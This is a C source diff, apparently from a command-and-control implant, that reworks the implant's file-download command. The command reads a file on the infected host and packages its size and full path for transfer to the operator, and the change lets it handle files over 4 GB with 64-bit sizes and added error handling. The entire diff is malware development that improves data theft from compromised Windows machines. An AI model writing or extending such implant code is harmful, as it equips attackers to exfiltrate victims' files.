@@ -773,12 +773,12 @@ VOID CommandFS( PPARSER Parser )
         {
             PDOWNLOAD_DATA Download = NULL;
             BUFFER         FileName = { 0 };
-            DWORD          FileSize = 0;
             PVOID          Buffer   = NULL;
             HANDLE         hFile    = NULL;
             BOOL           Success  = TRUE;
             WCHAR          FilePath[ MAX_PATH * 2 ] = { 0 };
             WCHAR          PathSize = MAX_PATH * 2;
+            LARGE_INTEGER  FileSize = { 0 };
 
             Buffer = ParserGetBytes( Parser, &FileName.Length );
 
@@ -801,15 +801,18 @@ VOID CommandFS( PPARSER Parser )
             PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, FilePath, NULL );
             PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )
 
-            FileSize = Instance.Win32.GetFileSize( hFile, 0 );
+            if ( ! Instance.Win32.GetFileSizeEx( hFile, &FileSize ) )
+            {
+                PUTS( "GetFileSizeEx: Failed" )
+
+                PACKAGE_ERROR_WIN32
+
+                Success = FALSE;
+                goto CleanupDownload;
+            }
 
             /* Start our download. */
-            if ( PathSize > 0 )
-                Download = DownloadAdd( hFile, FileSize );
-            else
-                Download = DownloadAdd( hFile, FileSize );
-
-            Download->RequestID = Instance.CurrentRequestID;
+            Download = DownloadAdd( hFile, FileSize.QuadPart );
 
             /*
 			 * Download Header:
@@ -832,7 +835,7 @@ VOID CommandFS( PPARSER Parser )
             PackageAddInt32( Package, Download->FileID   );
 
             /* Download Open Data */
-            PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
+            PackageAddInt64( Package, FileSize.QuadPart );
             if ( PathSize > 0 )
                 PackageAddWString( Package, FilePath );
             else
